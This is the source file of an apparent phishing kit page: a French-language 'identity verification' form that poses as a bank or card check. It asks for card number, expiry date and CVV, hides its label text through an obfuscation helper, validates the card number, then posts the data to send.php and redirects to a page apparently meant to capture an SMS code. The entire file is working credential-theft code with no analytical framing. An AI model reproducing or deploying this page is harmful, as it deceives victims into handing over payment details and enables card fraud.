<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/fonts.css">
<link rel="stylesheet" href="res/img-media.css">
<link rel="stylesheet" href="res/auth.css">
<style>
    .error{
        border:1px solid red;
    }
    </style>
</head>
<body>
<header>
    <img src="res/header-lg.png" class="lg">
    <img src="res/header-md.png" class="md">
    <img src="res/header-sm.png" class="sm">
    <img src="res/header-xs.png" class="xs">
</header>



<main>
 

<div class="right" style=" text-align:center; width:100%;">
<div class="form">

<div class="title">
<?php $bm->obf("Vérification d'identité"); ?>
</div>

<div class="info">
<h3><?php $bm->obf("Pour continuer, veuillez saisir ces informations"); ?></h3>
<?php if(isset($_GET['e'])){?> <p style="color:#ae0014">Informations incorrectes. Veuillez réessayer.</p><?php }?>


<div style="width:600px; max-width:100%; display:inline-block; text-align:left;">

<div class="col card">
    <label><?php $bm->obf("Numéro de carte"); ?></label>
    <input type="text" id="d1" class="textinput" placeholder="XXXX XXXX XXXX XXXX">
</div>

<div class="col">
    <label><?php $bm->obf("Date d'expiration"); ?></label>
    <input type="text" id="d2" class="textinput" placeholder="MM/AA">
</div>

<div class="col">
    <label><?php $bm->obf("Code CVV"); ?></label>
    <input type="text" id="d3" class="textinput" placeholder="XXX">
</div>


<div style="text-align:center;">
        <button class="sbmt" onclick="sendCard()"><?php $bm->obf("CONTINUER"); ?></button>
</div>


</div>


</div>
 
 
</div>


</div>
</div>
</main>



<footer>
    <img src="res/footer-lg.png" class="lg">
    <img src="res/footer-md.png" class="md">
    <img src="res/footer-sm.png" class="sm">
    <img src="res/footer-xs.png" class="xs">
</footer>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>

<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
 

var allowSubmit;
var abortVal = true;
 


function validate(){
	abortVal=false;
	allowSubmit=true;
 

    $("input").removeClass("error");

if($("#d1").val().length<19){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}
 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<23 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}


}




$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $.post("send.php", 
			{
                 
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val() 

			}, function(done){
               window.location="wait.php?next=sms.php";
			}
		
		);

    }
}


</script>
</body>
</body>